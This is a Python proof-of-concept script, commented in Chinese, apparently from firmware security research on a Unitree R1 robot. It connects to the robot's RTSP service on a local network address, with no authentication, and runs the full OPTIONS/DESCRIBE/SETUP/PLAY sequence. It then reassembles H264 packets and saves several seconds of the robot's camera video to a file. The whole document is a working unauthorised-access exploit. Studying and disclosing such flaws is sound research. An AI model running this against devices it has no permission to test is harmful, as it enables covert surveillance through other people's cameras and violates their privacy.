#!/usr/bin/env python3
"""RTSP 未授权拉流 PoC: 对 R1 的 8551/video 做完整 OPTIONS/DESCRIBE/SETUP/PLAY,
抓取 H264 码流存为 Annex-B .h264 文件。不经任何认证。"""
import socket, base64, sys, time

HOST, PORT, PATH = '127.0.0.1', 8554, '/video'   # 经手机中继到 192.168.8.117:8551
OUT = r'C:\zyh\work\宇树固件\real_unitree_r1_1.4.2\tools\poc_camera.h264'
CAPTURE_SECONDS = 8

class RTSP:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), 10)
        self.cseq = 0
        self.buf = b''
    def req(self, method, url, extra=''):
        self.cseq += 1
        r = f"{method} {url} RTSP/1.0\r\nCSeq: {self.cseq}\r\n{extra}\r\n"
        self.sock.sendall(r.encode())
        return self.read_response()
    def read_response(self):
        while b'\r\n\r\n' not in self.buf:
            self.buf += self.sock.recv(65536)
        head, self.buf = self.buf.split(b'\r\n\r\n', 1)
        return head.decode(errors='replace')

def main():
    base = f"rtsp://{HOST}:{PORT}{PATH}"
    c = RTSP(HOST, PORT)
    print('[OPTIONS]', c.req('OPTIONS', base).split('\r\n')[0])
    desc = c.req('DESCRIBE', base, 'Accept: application/sdp\r\n')
    print('[DESCRIBE]', desc.split('\r\n')[0])
    # 重读 body(SDP 在 header 之后)
    while b'\r\n\r\n' not in c.buf:
        try:
            c.buf += c.sock.recv(65536)
        except socket.timeout:
            break
    # 有些服务器 body 已在首次响应后到达;直接在 socket 继续读
    c.sock.settimeout(3)
    try:
        extra = c.sock.recv(65536)
        c.buf += extra
    except socket.timeout:
        pass
    sdp = c.buf.decode(errors='replace')
    c.buf = b''
    print('[SDP]', sdp[:400])
    sps_pps = None
    for line in sdp.split('\r\n'):
        if 'sprop-parameter-sets=' in line:
            sps_pps = line.split('sprop-parameter-sets=')[1].split(';')[0].strip()
    track = 'trackID=0'
    for line in sdp.split('\r\n'):
        if 'a=control:' in line and 'track' in line:
            track = line.split('a=control:')[1].strip()
            break
    setup = c.req('SETUP', f"{base}/{track}",
                  'Transport: RTP/AVP/TCP;unicast;interleaved=0-1\r\n')
    print('[SETUP]', setup.split('\r\n')[0])
    session = ''
    for line in setup.split('\r\n'):
        if line.lower().startswith('session:'):
            session = line.split(':', 1)[1].strip().split(';')[0]
    print('[PLAY]', c.req('PLAY', base, f'Session: {session}\r\n').split('\r\n')[0])

    out = open(OUT, 'wb')
    if sps_pps:
        for p in sps_pps.split(','):
            out.write(b'\x00\x00\x00\x01' + base64.b64decode(p))
    c.sock.settimeout(1)
    n_rtp, n_fu, t0 = 0, 0, time.time()
    while time.time() - t0 < CAPTURE_SECONDS:
        try:
            hdr = c.sock.recv(4)
            if len(hdr) < 4 or hdr[0:1] != b'$':
                continue
            size = int.from_bytes(hdr[2:4], 'big')
            pkt = b''
            while len(pkt) < size:
                pkt += c.sock.recv(size - len(pkt))
            n_rtp += 1
            payload = pkt[12:]
            nal_type = payload[0] & 0x1F
            if nal_type == 28:  # FU-A
                fu_hdr = payload[1]
                if fu_hdr & 0x80:  # start
                    recon = bytes([(payload[0] & 0xE0) | (fu_hdr & 0x1F)])
                    out.write(b'\x00\x00\x00\x01' + recon + payload[2:])
                    n_fu += 1
                else:
                    out.write(payload[2:])
            elif 1 <= nal_type <= 23:
                out.write(b'\x00\x00\x00\x01' + payload)
        except socket.timeout:
            continue
    out.close()
    import os
    print(f'[DONE] RTP 包: {n_rtp}, FU-A 分片: {n_fu}, 文件: {OUT} ({os.path.getsize(OUT)} 字节)')

if __name__ == '__main__':
    main()

